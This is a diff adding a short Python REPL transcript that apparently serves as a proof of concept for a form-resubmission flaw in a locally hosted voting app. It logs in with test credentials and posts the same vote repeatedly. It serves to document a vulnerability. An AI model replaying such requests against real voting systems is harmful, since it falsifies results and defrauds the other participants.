@@ -1,0 +1,23 @@
+written in Python REPL shell to exploit form resubmission vulnerability in the voting system
+
+import requests
+s = requests.session()
+
+print(s.get("http://127.0.0.1:5000/submission/JsemDrsnyTucnak007"))
+<Response [200]>
+
+vote = {"type": "vote"}
+print(s.post("http://127.0.0.1:5000/submission/JsemDrsnyTucnak007", data=vote))
+<Response [500]>
+user = {"name": "test", "password": "test"}
+login = s.post("http://127.0.0.1:5000/login", data=user)
+print(login)
+<Response [200]>
+
+
+print(s.post("http://127.0.0.1:5000/submission/JsemDrsnyTucnak007", data=vote))
+<Response [200]>
+print(s.post("http://127.0.0.1:5000/submission/JsemDrsnyTucnak007", data=vote))
+<Response [200]>
+
+s.close()
